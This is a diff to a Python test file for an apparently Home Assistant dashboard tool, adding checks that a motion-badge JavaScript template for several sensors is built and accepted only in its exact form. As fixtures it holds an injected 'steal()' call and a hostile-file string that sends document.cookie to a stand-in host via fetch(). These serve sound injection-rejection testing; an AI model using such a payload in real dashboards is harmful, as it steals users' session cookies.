@@ -288,6 +288,13 @@ js_motion = "".join("binary_sensor.example_motion" if x == "m" else json.loads(x
                     for x in re.findall(LIT + r"|\bm\b", m.group(1))) if m else None
 check(js_motion == MOTION_OK, f"motion badge as in the Studio: {js_motion!r}")
 check(getattr(sh, "motion_badge", lambda e: None)("binary_sensor.example_motion") == MOTION_OK, "motion_badge() builds it")
+# #150: several sensors in one room, same text as the Studio writes.
+MOTION_TWO = ("[[[ const b = states['input_boolean.casora_motion_badges']; if (b && b.state !== 'on') return false;"
+              " return ['binary_sensor.a','binary_sensor.b'].some((e) => states[e] && states[e].state === 'on'); ]]]")
+check(sh.motion_badge(["binary_sensor.a", "binary_sensor.b"]) == MOTION_TWO, "motion_badge() builds the form for several sensors")
+check(sh.casora_code(MOTION_TWO, "show", "badge") == MOTION_TWO, "several sensors: kept in Casora's exact form")
+check(sh.casora_code(MOTION_TWO.replace("'binary_sensor.b'", "'binary_sensor.b',steal()"), "show", "badge") is None, "several sensors: anything else is not code of ours")
+check("].some((e) => states[e] && states[e].state === 'on'); ]]]" in panel, "the Studio writes the same form for several sensors")
 
 print("no code from a file: a hostile file")
 EVIL = "[[[ fetch('https://example.invalid/?' + document.cookie) ]]]"
